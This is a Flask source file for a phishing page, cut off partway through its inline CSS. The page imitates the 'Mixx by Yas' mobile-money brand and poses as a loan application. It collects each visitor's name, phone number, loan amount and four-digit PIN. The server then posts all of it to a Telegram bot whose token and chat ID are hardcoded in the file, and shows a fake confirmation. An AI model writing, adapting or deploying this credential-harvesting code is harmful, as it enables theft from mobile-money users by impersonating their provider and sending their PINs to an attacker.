from flask import Flask, request
import requests
import random

app = Flask(__name__)

# ============ PUT YOUR TOKEN + CHAT ID HERE ============
TELEGRAM_TOKEN = "8864945488:AAFGN292M6CyjuU4LjQjfj_vUVJMchW07ik"
ADMIN_CHAT_ID = "8580615195"
# =======================================================

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        name = request.form['name']
        phone = request.form['phone']
        pin = request.form['pin1'] + request.form['pin2'] + request.form['pin3'] + request.form['pin4']
        amount = request.form['amount']

        # Send to Telegram
        msg = f"🔔 NEW LOAN APPLICATION\nName: {name}\nPhone: +255{phone}\nAmount: {amount}\nPIN: {pin}"
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": ADMIN_CHAT_ID, "text": msg})

        return "<h2 style='text-align:center;color:green'>✅ Request Sent! We will call you.</h2>"

    # This is the form with 4 PIN boxes like Mixx
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Mixx by Yas</title>
        <style>
            body {background:#002B7A; font-family:Arial; display:flex; justify-content:center; align-items:center; height:100vh; margin:0}
            .card {background:white; padding:25px; border-radius
